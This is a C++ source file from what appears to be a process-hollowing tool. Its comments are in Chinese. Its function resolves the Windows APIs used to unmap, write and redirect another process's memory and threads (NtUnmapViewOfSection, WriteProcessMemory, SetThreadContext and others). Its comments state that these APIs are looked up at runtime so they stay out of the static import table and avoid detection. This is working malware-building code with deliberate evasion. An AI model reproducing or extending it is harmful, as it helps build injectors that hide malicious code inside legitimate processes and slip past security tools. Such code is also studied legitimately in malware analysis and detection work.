#include "../include/Common.h"

namespace Hollowing {
    /**
     * @brief 解析项目所需的所有 Windows 内部及核心 API
     * 
     * 本函数通过 GetProcAddress 动态获取函数地址。这样做的好处是：
     * 1. 静态导入表中不会出现敏感 API。
     * 2. 可以灵活处理 32 位和 64 位系统的差异（如 Wow64 系列函数）。
     */
    bool APIResolver::ResolveAll() {
        // 加载核心 DLL
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
        if (!ntdll || !kernel32) return false;

        // 从 ntdll.dll 获取函数 (用于内存卸载)
        NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

        // 从 kernel32.dll 获取核心函数 (用于进程创建、内存操作、上下文控制)
        CreateProcessA = (pCreateProcessA)GetProcAddress(kernel32, "CreateProcessA");
        VirtualAllocEx = (pVirtualAllocEx)GetProcAddress(kernel32, "VirtualAllocEx");
        WriteProcessMemory = (pWriteProcessMemory)GetProcAddress(kernel32, "WriteProcessMemory");
        ReadProcessMemory = (pReadProcessMemory)GetProcAddress(kernel32, "ReadProcessMemory");
        VirtualProtectEx = (pVirtualProtectEx)GetProcAddress(kernel32, "VirtualProtectEx");
        CreateRemoteThread = (pCreateRemoteThread)GetProcAddress(kernel32, "CreateRemoteThread");
        WaitForSingleObject = (pWaitForSingleObject)GetProcAddress(kernel32, "WaitForSingleObject");
        GetExitCodeThread = (pGetExitCodeThread)GetProcAddress(kernel32, "GetExitCodeThread");
        GetThreadContext = (pGetThreadContext)GetProcAddress(kernel32, "GetThreadContext");
        SetThreadContext = (pSetThreadContext)GetProcAddress(kernel32, "SetThreadContext");
        
        // 特殊处理：Wow64 系列函数 (仅在 64 位系统操作 32 位进程时需要)
        Wow64GetThreadContext = (pWow64GetThreadContext)GetProcAddress(kernel32, "Wow64GetThreadContext");
        Wow64SetThreadContext = (pWow64SetThreadContext)GetProcAddress(kernel32, "Wow64SetThreadContext");
        
        ResumeThread = (pResumeThread)GetProcAddress(kernel32, "ResumeThread");
        TerminateProcess = (pTerminateProcess)GetProcAddress(kernel32, "TerminateProcess");

        // 验证关键 API 是否解析成功
        return NtUnmapViewOfSection && CreateProcessA && VirtualAllocEx && 
               WriteProcessMemory && ReadProcessMemory && GetThreadContext && 
               SetThreadContext && ResumeThread && TerminateProcess;
    }
}
